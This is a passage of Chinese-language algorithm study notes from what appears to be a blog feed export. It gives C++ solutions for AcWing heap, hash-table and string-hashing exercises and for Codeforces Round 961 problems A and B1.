class="keyword">for</span> (<span class="type">int</span> i = n / <span class="number">2</span>; i &gt;= <span class="number">1</span>; i--)</span><br><span class="line">    <span class="built_in">down</span>(i);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">    cout &lt;&lt; h[<span class="number">1</span>] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    h[<span class="number">1</span>] = h[siz--];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">down</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="839-模拟堆"><a href="#839-模拟堆" class="headerlink" title="839. 模拟堆"></a>839. 模拟堆</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240725085933555.png" alt="image-20240725085933555"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N=<span class="number">1e5</span><span class="number">+10</span>;</span><br><span class="line"><span class="type">int</span> h[N];   <span class="comment">//堆</span></span><br><span class="line"><span class="type">int</span> ph[N];  <span class="comment">//存放第k个插入点的下标</span></span><br><span class="line"><span class="type">int</span> hp[N];  <span class="comment">//存放堆中点的插入次序</span></span><br><span class="line"><span class="type">int</span> cur_size;   <span class="comment">//size 记录的是堆当前的数据多少,即堆的最后一个元素</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">heap_swap</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">swap</span>(h[a],h[b]);            <span class="comment">//交换堆中两个元素的值</span></span><br><span class="line">    <span class="built_in">swap</span>(hp[a],hp[b]);          <span class="comment">//交换插入次序</span></span><br><span class="line">    <span class="built_in">swap</span>(ph[hp[a]],ph[hp[b]])  ;   <span class="comment">//交换插入点的下标</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">down</span><span class="params">(<span class="type">int</span> u)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> t=u;</span><br><span class="line">    <span class="keyword">if</span>(u*<span class="number">2</span>&lt;=cur_size&amp;&amp;h[t]&gt;h[u*<span class="number">2</span>]) t=u*<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span>(u*<span class="number">2</span><span class="number">+1</span>&lt;=cur_size&amp;&amp;h[t]&gt;h[u*<span class="number">2</span><span class="number">+1</span>])  t=u*<span class="number">2</span><span class="number">+1</span>;</span><br><span class="line">    <span class="keyword">if</span>(u!=t)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">heap_swap</span>(u,t);</span><br><span class="line">        <span class="built_in">down</span>(t);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">up</span><span class="params">(<span class="type">int</span> u)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(u/<span class="number">2</span>&gt;<span class="number">0</span>&amp;&amp;h[u]&lt;h[u/<span class="number">2</span>]) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">heap_swap</span>(u,u/<span class="number">2</span>);</span><br><span class="line">        <span class="built_in">up</span>(u&gt;&gt;<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    <span class="type">int</span> m = <span class="number">0</span>;        <span class="comment">//m用来记录插入的数的个数</span></span><br><span class="line">      <span class="keyword">while</span>(n--)</span><br><span class="line">    &#123;</span><br><span class="line">        string op;</span><br><span class="line">        <span class="type">int</span> k,x;</span><br><span class="line">        cin&gt;&gt;op;</span><br><span class="line">        <span class="keyword">if</span>(op==<span class="string">&quot;I&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            cin&gt;&gt;x;</span><br><span class="line">            m++;</span><br><span class="line">            h[++cur_size]=x;    <span class="comment">//置于堆的最后</span></span><br><span class="line">            ph[m]=cur_size;     <span class="comment">//记录第k个插入点的下标</span></span><br><span class="line">            hp[cur_size]=m;     <span class="comment">//记录插入次序</span></span><br><span class="line">            <span class="comment">//down(size);</span></span><br><span class="line">            <span class="built_in">up</span>(cur_size);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(op==<span class="string">&quot;PM&quot;</span>)    cout&lt;&lt;h[<span class="number">1</span>]&lt;&lt;endl;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(op==<span class="string">&quot;DM&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">heap_swap</span>(<span class="number">1</span>,cur_size);</span><br><span class="line">            cur_size--;</span><br><span class="line">            <span class="built_in">down</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(op==<span class="string">&quot;D&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            cin&gt;&gt;k;</span><br><span class="line">            <span class="type">int</span> u=ph[k];                <span class="comment">//这里一定要用u=ph[k]保存第k个插入点的下标</span></span><br><span class="line">            <span class="built_in">heap_swap</span>(u,cur_size);          <span class="comment">//因为在此处heap_swap操作后ph[k]的值已经发生 </span></span><br><span class="line">            cur_size--;                    <span class="comment">//如果在up,down操作中仍然使用ph[k]作为参数就会发生错误</span></span><br><span class="line">            <span class="built_in">up</span>(u);</span><br><span class="line">           <span class="built_in">down</span>(u);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(op==<span class="string">&quot;C&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            cin&gt;&gt;k&gt;&gt;x;</span><br><span class="line">            h[ph[k]]=x;                 <span class="comment">//此处由于未涉及heap_swap操作且下面的up、down操作只会发生一个所以</span></span><br><span class="line">            <span class="built_in">down</span>(ph[k]);                <span class="comment">//所以可直接传入ph[k]作为参数</span></span><br><span class="line">            <span class="built_in">up</span>(ph[k]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>//TODO</p><h3 id="840-模拟散列表、"><a href="#840-模拟散列表、" class="headerlink" title="840. 模拟散列表、"></a>840. 模拟散列表、</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240725091813611.png" alt="image-20240725091813611"></p><h4 id="拉链法："><a href="#拉链法：" class="headerlink" title="拉链法："></a>拉链法：</h4><p>数组 +（重复元素插入链表）</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">100003</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> h[N], e[N], ne[N], idx;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">insert</span><span class="params">(<span class="type">int</span> x)</span> <span class="comment">//链式前向星</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> k = (x % N + N) % N;</span><br><span class="line">  <span class="comment">//(x + N)%N;  不能采用以下方式因为x可能远大于N的范围</span></span><br><span class="line">  e[idx] = x;     <span class="comment">//插入元素</span></span><br><span class="line">  ne[idx] = h[k]; <span class="comment">//将插入的元素插入到链表的头部</span></span><br><span class="line">  h[k] = idx++;   <span class="comment">//指向最后一个插入的元素</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> pos = (x % N + N) % N;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = h[pos]; i != <span class="number">-1</span>; i = ne[i]) &#123;</span><br><span class="line">    <span class="keyword">if</span> (x == e[i])</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">memset</span>(h, <span class="number">-1</span>, <span class="built_in">sizeof</span>(h));</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">  <span class="keyword">while</span> (n--) &#123;</span><br><span class="line">    <span class="type">char</span> op[<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s%d&quot;</span>, op, &amp;x);</span><br><span class="line">    <span class="keyword">if</span> (op[<span class="number">0</span>] == <span class="string">&#x27;I&#x27;</span>)</span><br><span class="line">      <span class="built_in">insert</span>(x);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (op[<span class="number">0</span>] == <span class="string">&#x27;Q&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">find</span>(x))</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Yes\n&quot;</span>);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;No\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="开放寻址法"><a href="#开放寻址法" class="headerlink" title="开放寻址法"></a>开放寻址法</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">200003</span>, null = <span class="number">0x3f3f3f3f</span>;    </span><br><span class="line"><span class="comment">//0x3f3f3f3f * 2 = 2122219134，无穷大相加依然不会溢出。</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> h[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> pos = (x % N + N) % N;</span><br><span class="line">  <span class="keyword">while</span>(h[pos] != null &amp;&amp; h[pos] != x)</span><br><span class="line">  &#123;</span><br><span class="line">    pos++;</span><br><span class="line">    <span class="keyword">if</span>(pos == N)</span><br><span class="line">      pos = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> pos;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">memset</span>(h, <span class="number">0x3f</span>, <span class="built_in">sizeof</span>(h));</span><br><span class="line">  <span class="type">int</span> n;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">  <span class="keyword">while</span> (n--) &#123;</span><br><span class="line">    <span class="type">char</span> op[<span class="number">2</span>];</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s%d&quot;</span>, op, &amp;x);</span><br><span class="line">    <span class="keyword">if</span> (op[<span class="number">0</span>] == <span class="string">&#x27;I&#x27;</span>)</span><br><span class="line">        h[<span class="built_in">find</span>(x)] = x;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (op[<span class="number">0</span>] == <span class="string">&#x27;Q&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (h[<span class="built_in">find</span>(x)] != null)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Yes\n&quot;</span>);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;No\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="字符串哈希"><a href="#字符串哈希" class="headerlink" title="字符串哈希"></a>字符串哈希</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240725092019524.png" alt="image-20240725092019524"></p><p><a href="https://www.acwing.com/solution/content/24738/#">AcWing 841. 字符串哈希 【公式助理解】 - AcWing</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> ULL;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N = <span class="number">1e5</span><span class="number">+5</span>,P = <span class="number">13331</span>;</span><br><span class="line">ULL h[N],p[N];</span><br><span class="line"></span><br><span class="line"><span class="function">ULL <span class="title">query</span><span class="params">(<span class="type">int</span> l,<span class="type">int</span> r)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> h[r] - h[l - <span class="number">1</span>]*p[r - l + <span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> n, m;</span><br><span class="line">    cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">    string s;</span><br><span class="line">    cin &gt;&gt; s;</span><br><span class="line">    p[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    h[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span> ; i &lt; s.<span class="built_in">size</span>(); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        h[i + <span class="number">1</span>] = h[i] * P + s[i];</span><br><span class="line">        p[i + <span class="number">1</span>] = p[i] * P;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(m--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> l1, l2, r1, r2;</span><br><span class="line">        cin &gt;&gt; l1 &gt;&gt; r1 &gt;&gt; l2 &gt;&gt; r2;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">query</span>(l1, r1) == <span class="built_in">query</span>(l2, r2))</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;Yes&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;No&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Codeforces Round 961 (Div. 2)</title>
      <link href="/2024/07/23/codeforce/2024_7_23/"/>
      <url>/2024/07/23/codeforce/2024_7_23/</url>
      
        <content type="html"><![CDATA[<h3 id="A"><a href="#A" class="headerlink" title="A"></a>A</h3><p><img src="./../../../../../AppData/Roaming/Typora/typora-user-images/image-20240725092944120.png" alt="image-20240725092944120"></p><p>目标是将所有 k 个棋子放置在棋盘上，使得占据的对角线的数量最少。</p><p>易得最大对角线一条，长度为n，之后的对角线长度一次减一，且相同长度的对角线有两条。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">solve</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> m,n;</span><br><span class="line">    <span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">    cin &gt;&gt; m &gt;&gt; n;</span><br><span class="line">    <span class="keyword">if</span>(n == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">         cout &lt;&lt; cnt &lt;&lt; endl;</span><br><span class="line">         <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cnt+= <span class="number">1</span>;</span><br><span class="line">    n -=m;</span><br><span class="line">    m--;</span><br><span class="line">    <span class="type">int</span> flag = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(n &lt;= <span class="number">0</span>)  <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span>(flag == <span class="number">2</span>)    </span><br><span class="line">        &#123;</span><br><span class="line">            flag = <span class="number">0</span>;</span><br><span class="line">            m--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            flag++;</span><br><span class="line">            cnt++;</span><br><span class="line">            n -= m;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; cnt &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="type">int</span> n;</span><br><span class="line">   cin &gt;&gt; n;</span><br><span class="line">   <span class="keyword">while</span>(n--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">solve</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="B1"><a href="#B1" class="headerlink" title="B1"></a>B1</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240725111122077.png" alt="image-20240725111122077"></p><h4 id=""><a href="#" class="headerlink" title=" "></a> </h4><ul><li>有一个花店，提供了 n 朵花，每朵花的花瓣数不同。每朵花的价格等于它的花瓣数。</li><li>一个女孩想要为她的生日购买一个花束。她的目标是使花束的总花瓣数尽可能多。</li><li><p>她有 m 枚硬币作为预算。</p></li><li><p>花束中所有花的花瓣数之间的差值不能超过1。例如，花瓣数为3和4的花可以在同一个花束中，但是花瓣数为1和3的花不能在同一个花束中。</p></li><li>总花瓣数最大化的前提下，花束的总价格不能超过 mmm 枚硬币。</li></ul><p>这题比赛没做出来，没考虑到一些特殊情况，下面是黄神的题解，可以理解为采用了滑动窗口：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span> </span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> t;</span><br><span class="line">  cin &gt;&gt; t; </span><br><span class="line"> </span><br><span class="line">  <span class="keyword">while</span> (t--) &#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> n, m;</span><br><span class="line">    cin &gt;&gt; n &gt;&gt; m; </span><br><span class="line"> </span><br><span class="line">    <span class="function">vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; <span class="title">flowers</span><span class="params">(n)</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">      cin &gt;&gt; flowers[i]; </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">sort</span>(flowers.<span class="built_in">begin</span>(), flowers.<span class="built_in">end</span>());</span><br><span class="line"> </span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> max_petals = <span class="number">0</span>;  </span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> num = <span class="number">0</span>;<span class="comment">//记录当前的花瓣数</span></span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> cost = <span class="number">0</span>;<span class="comment">//当前的花销</span></span><br><span class="line">    <span class="comment">//前i朵中选j个；</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>,j = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">      num += flowers[i];</span><br><span class="line">      cost += flowers[i];</span><br><span class="line">      <span class="keyword">while</span> (j &lt;= i&amp;&amp;(cost&gt;m||(flowers[i]-flowers[j])&gt;<span class="number">1</span>))</span><br><span class="line">      &#123;</span><br><span class="line">        cost -= flowers[j];</span><br><span class="line">        num -= flowers[j];</span><br><span class="line">        <span class="comment">//第j朵就不要了</span></span><br><span class="line">        j++;</span><br><span class="line">      &#125;</span><br><span class="line">      max_petals = <span class="built_in">max</span>(max_petals, cost);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"> 